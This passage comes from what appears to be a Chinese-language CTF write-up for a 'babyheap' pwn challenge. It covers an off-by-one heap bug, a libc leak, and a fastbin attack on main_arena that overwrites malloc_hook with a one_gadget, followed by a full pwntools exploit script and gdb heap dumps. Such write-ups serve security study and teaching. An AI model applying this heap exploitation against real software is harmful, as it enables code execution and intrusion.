class=\"params\">(element *<span class=\"built_in\">list</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 oldSizePlus1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> newsize; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index: \"</span>);</span><br><span class=\"line\">  i = getlong();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt;= <span class=\"number\">0</span> &amp;&amp; i &lt;= <span class=\"number\">15</span> &amp;&amp; <span class=\"built_in\">list</span>[i].inuse == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size: \"</span>);</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = getlong();</span><br><span class=\"line\">    newsize = oldSizePlus1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)oldSizePlus1 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      oldSizePlus1 = <span class=\"built_in\">list</span>[i].size + <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( newsize &lt;= oldSizePlus1 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content: \"</span>);</span><br><span class=\"line\">        readN((<span class=\"keyword\">char</span> *)<span class=\"built_in\">list</span>[i].chunkptr, newsize);<span class=\"comment\">// off by one</span></span><br><span class=\"line\">        LODWORD(oldSizePlus1) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Chunk %d Updated\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid Index\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> oldSizePlus1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>free掉对应chunk，并将数组上相应位置设置为NULL，不存在UAF。</p>\n<h4 id=\"view\"><a href=\"#view\" class=\"headerlink\" title=\"view\"></a>view</h4><p>根据inuse，show出chunk的内容。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>本题应该是构造overlapping，以实现信息泄漏和fastbin attack。</p>\n<h4 id=\"leak-libc-1\"><a href=\"#leak-libc-1\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>溢出一个小chunk，改大下一个chunk的size位，然后free掉被修改的chunk，这时chunk将会被放到unsorted bin中，之后再malloc较小的size，即可从被分离后的last remainder处leak处main_arena地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>按常规思路，我们只要能将chunk申请到malloc_hook之前的那个位置（即保证size为0x7f），然后修改malloc_hook为one_gadget即可，但是本题对申请的chunk的size进行限制，最大只能为0x60，所以不可能通过直接的fastbin attack修改fd从而申请到那个位置。这里，我们采用改main_arena中的top指针的方法，令下次分配从top指针指向的地址开始。</p>\n<p>main_arena的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">    __libc_lock_define(, mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">    mchunkptr top; <span class=\"comment\">// top chunk的地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">    mchunkptr last_remainder;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">    mchunkptr bins[ NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[ BINMAPSIZE ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list, points to the next arena */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">       by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">       the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">       free_list_lock in arena.c.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">    INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">    INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>gdb调试：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f81fbc89b20</span><br><span class=\"line\">0x7f81fbc89b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f81fbc89b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000559b443720e0</span><br><span class=\"line\">0x7f81fbc89b80 &lt;main_arena+96&gt;:\t0x0000559b44372070\t0x0000559b44372070</span><br><span class=\"line\">0x7f81fbc89b90 &lt;main_arena+112&gt;:\t0x0000559b44372070\t0x00007f81fbc89b88</span><br><span class=\"line\">0x7f81fbc89ba0 &lt;main_arena+128&gt;:\t0x00007f81fbc89b88\t0x00007f81fbc89b98</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x559b44372010, size=0x20, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372010     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x559b44372030, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372030     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b44372080, size=0x50, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0000559b44372080     78 9b c8 fb 81 7f 00 00 78 9b c8 fb 81 7f 00 00    x.......x.......]</span><br><span class=\"line\">Chunk(addr=0x559b443720d0, size=0x20, flags=)</span><br><span class=\"line\">    [0x0000559b443720d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]</span><br><span class=\"line\">Chunk(addr=0x559b443720f0, size=0x20f20, flags=PREV_INUSE)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以main_arena + 88处存储的是top chunk的地址，尝试在这个地址前找一个合适的偏移。但是前面都是fastbin数组存储的fd指针，如果fastbin链表中没有chunk的话，就不可能有合适的偏移地址。所以要首先向fastbin 填充一些chunk的地址，这里有个trick，一般来说堆地址是0x55开头的（有时候是0x56），所以我们用fastbin在main_arena占位后，找到一个合适的偏移，使得size为0x55(0x56)，然后malloc(0x40)即可。这里是根据<code>(0x55 &gt;&gt; 4) - 2 =  4</code>计算得到chunk在fastbin中的下标。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7f4b01358b78-0x58 + 0x20 + 5</span><br><span class=\"line\">0x7f4b01358b45 &lt;main_arena+37&gt;:\t0xad249d50e0000000\t0x0000000000000055</span><br><span class=\"line\">0x7f4b01358b55 &lt;main_arena+53&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b65 &lt;main_arena+69&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7f4b01358b75 &lt;main_arena+85&gt;:\t0xad249d5140000000\t0xad249d5070000055</span><br><span class=\"line\">0x7f4b01358b85 &lt;main_arena+101&gt;:\t0x4b01358b78000055\t0x4b01358b7800007f</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到main_arena+0x20+5时，size为0x55，然后就可以覆盖top chunk或者last remainder了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap bins</span><br><span class=\"line\">[+] No Tcache in this version of libc</span><br><span class=\"line\">────────────────────── Fastbins for arena 0x7fedf8a74b20 ──────────────────────</span><br><span class=\"line\">Fastbins[idx=0, size=0x10] 0x00</span><br><span class=\"line\">Fastbins[idx=1, size=0x20] 0x00</span><br><span class=\"line\">Fastbins[idx=2, size=0x30] 0x00</span><br><span class=\"line\">Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x55f94d040080, size=0x50, flags=PREV_INUSE)  ←  Chunk(addr=0x7fedf8a74b55, size=0x50, flags=PREV_INUSE|NON_MAIN_ARENA) </span><br><span class=\"line\">Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x55f94d0400f0, size=0x60, flags=PREV_INUSE) </span><br><span class=\"line\">Fastbins[idx=5, size=0x60] 0x00</span><br><span class=\"line\">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>\n<p>​    当成功修改top指针后，再次malloc，会从top指针处开始任意分配，这时分配到malloc_hook之前即可，但仍然需要绕过对size的检查，所以我们令top chunk指向main_arena - 0x33的地址。</p>\n<p>​    </p>\n<p>​    但是，该题利用成功率不是百分之百，有一定几率失败。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./babyheap\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Size: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">view</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Command: \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index: \"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>) <span class=\"comment\"># 0 </span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">main_arena = addr - <span class=\"number\">0x58</span></span><br><span class=\"line\">one_gadget = libc.address + <span class=\"number\">0x4526a</span> <span class=\"comment\"># f1147 4526a</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">chunk_addr = main_arena + <span class=\"number\">0x20</span> + <span class=\"number\">5</span></span><br><span class=\"line\">fake_addr = main_arena - <span class=\"number\">0x33</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># use 4 to write to truly 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x58</span>) <span class=\"comment\"># 2 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(chunk_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">update(<span class=\"number\">4</span>,len(payload), payload) <span class=\"comment\"># change fd of truly idx2</span></span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>) <span class=\"comment\"># 5 at main_arena</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = (<span class=\"number\">0x58</span> - <span class=\"number\">0x30</span> - <span class=\"number\">5</span>) * <span class=\"string\">\"\\x00\"</span></span><br><span class=\"line\">payload += p64(fake_addr)</span><br><span class=\"line\">update(<span class=\"number\">5</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">allocate(<span class=\"number\">0x48</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">payload = <span class=\"number\">0x13</span> * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">payload += p64(one_gadget)</span><br><span class=\"line\">update(<span class=\"number\">6</span>, len(payload), payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h1><p><a href=\"https://www.anquanke.com/post/id/175630\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/175630</a></p>\n<p><a href=\"http://eternalsakura13.com/2018/04/03/babyheap/\" target=\"_blank\" rel=\"noopener\">http://eternalsakura13.com/2018/04/03/babyheap/</a></p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":5,"path":"api/tags/pwn.json"}]}